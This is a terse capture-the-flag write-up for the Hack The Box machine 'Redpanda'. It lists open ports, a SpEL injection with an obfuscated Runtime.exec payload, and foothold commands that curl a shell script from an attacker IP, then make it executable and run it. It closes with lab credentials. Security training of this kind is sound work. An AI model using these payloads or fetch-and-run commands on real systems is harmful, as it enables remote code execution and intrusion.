Hack The Box : Redpanda

IP : 10.10.11.170

Open ports

```bash
22/tcp   open  ssh   
8080/tcp open  http-proxy

```

Port 80 is running a java based web application called spring boot

```html
  <title>Red Panda Search | Made with Spring Boot</title>
```

SpEl vuln in name parameter

```
7*7 49
```

Reading etc/passwd file

payload

```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec((T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(116))).getInputStream())}
```

Foothold

backdoor

```
curl 10.10.16.17/shell.sh -o /dev/shm/shell.sh
chmod +x /dev/shm/shell.sh
bash /dev/shm/shell.sh
```

username : woodenk
password : RedPandazRule

